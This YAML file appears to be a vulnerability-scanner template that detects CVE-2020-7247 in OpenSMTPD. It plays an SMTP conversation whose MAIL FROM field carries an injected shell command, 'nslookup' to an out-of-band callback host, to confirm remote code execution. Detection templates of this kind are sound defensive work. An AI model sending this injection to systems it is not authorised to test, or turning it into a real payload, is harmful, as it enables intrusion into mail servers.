id: cve-2020-7247
info:
  author: princechaddha
  name: OpenSMTPD 6.4.0 - 6.6.1 Remote Code Execution
  reference: https://www.openwall.com/lists/oss-security/2020/01/28/3
  severity: critical
  tags: cve,cve2020,smtp,opensmtpd,network,rce,oob
network:
- host:
  - '{{Hostname}}'
  - '{{Hostname}}:25'
  inputs:
  - read: 1024
  - data: "helo target\r\n"
    read: 1024
  - data: "MAIL FROM:<;nslookup {{interactsh-url}};>\r\n"
    read: 1024
  - data: "RCPT TO:<root>\r\n"
    read: 1024
  - data: "DATA\r\n"
    read: 1024
  - data: "\r\nxxxx\r\n.\r\n"
    read: 1024
  - data: "QUIT\r\n"
    read: 1024
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: raw
    type: word
    words:
    - Message accepted for delivery
  matchers-condition: and
